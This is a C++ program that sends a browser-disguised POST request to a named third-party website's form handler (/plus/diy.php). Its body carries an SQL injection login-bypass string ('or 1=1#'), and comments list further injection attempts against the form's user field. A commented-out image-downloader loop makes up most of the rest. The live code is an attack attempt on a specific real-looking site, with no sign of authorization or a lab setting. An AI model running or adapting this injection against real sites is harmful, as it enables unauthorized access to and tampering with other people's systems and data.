#include<iostream>
#include<string>
#include<sstream>
#include"MyHttp.h"
#include<fstream>
#include<regex>
#include<vector>
using namespace std;
int main(int argc, char**argv)
{
	string str_find = "\\u63d2\\u5165\\u6210\\u529f2";
	string str;
	MyHttp http("124.156.182.177", 80);
	http.SetHost("myloy.cn");
	http.SetUser_Agent("Mozilla/5.0 (Windows NT 10.0; WOW64; rv:67.0) Gecko/20100101 Firefox/67.0");
	http.SetAccept("*/*");
	http.SetAccept_Language("zh-CN");
	http.SetConnection("keep-alive");
	http.SetContent_Type("application/x-www-form-urlencoded; charset=UTF-8");
	http.SetCookie("login_count=1");
	http.SetOrigin("http://myloy.cn");
	http.SetReferer("http://myloy.cn/Ru_op/");
	str = http.PageAccess("http://myloy.cn/plus/diy.php", "POST", "select * from users where username='' or 1=1#' and password=md5('')");
	//user = 1300601979 & pass = 1300601979sb&action = post & do = 4 & diyid = 4
	//user = ’ or 1=1# & pass = 1300601979sb&action = post & do = 4 & diyid = 4

	//http://h.b2233.xyz/?m=vod-type-8-0.html
	cout << str << endl;
	http.Close();


	///*
	//string filename("C:\\Users\\guibinw\\Desktop\\webstr.txt");
	//ofstream file(filename,ios::binary);
	//file.write(webstr.c_str(), webstr.size());
	//file.close();
	//*/

	//string filesuffix;
	//string filepath;
	//string host;
	//int t = 0;
	//for (string webstr : vec)
	//{
	//	//匹配host
	//	for (string::iterator it1 = webstr.begin() + 7; it1 != webstr.begin() + 22; ++it1)
	//	{
	//		host += *it1;
	//	}
	//	//匹配文件后缀名
	//	for (string::iterator it = webstr.end() - 4; it != webstr.end(); ++it)
	//	{
	//		filesuffix += *it;
	//	}
	//	//合成文件名字通过变量t是文件名称不同
	//	filepath = "C:\\Users\\guibinw\\Desktop\\hhh\\" + to_string(t) + filesuffix;
	//	cout << filepath << endl;
	//	MyHttp http(host, 80);

	//	http.SetHost(host);
	//	host.clear();
	//	filesuffix.clear();
	//	string htmlstr;
	//	htmlstr = http.PageAccess(webstr, "GET");
	//	if (htmlstr != "")
	//	{
	//		cout << "DownImage Succeed" << endl;
	//		regex k("Content-Length: [\\d]+");
	//		string tempsize;
	//		string temstr;
	//		int tsize = 0;
	//		for (sregex_iterator it2(htmlstr.begin(), htmlstr.end(), k), it2_end; it2 != it2_end; ++it2)
	//		{
	//			temstr = it2->str();
	//			for (string::iterator it3 = temstr.begin() + 16; it3 != temstr.end(); ++it3)
	//			{
	//				tempsize += *it3;
	//			}
	//		}
	//		tsize = atoi(tempsize.c_str());
	//		ofstream file(filepath, ios::binary);
	//		for (string::iterator it4 = htmlstr.end() - tsize; it4 != htmlstr.end(); ++it4)
	//		{
	//			file.write(&(*it4), sizeof(char));
	//		}
	//		file.close();

	//		cout << tsize << endl;
	//		++t;
	//	}
	//	else
	//	{
	//		cout << "DownImage error" << endl;
	//	}
	//	http.Close();
	//	filepath.clear();

	//}

	system("pause");
	return 0;
}


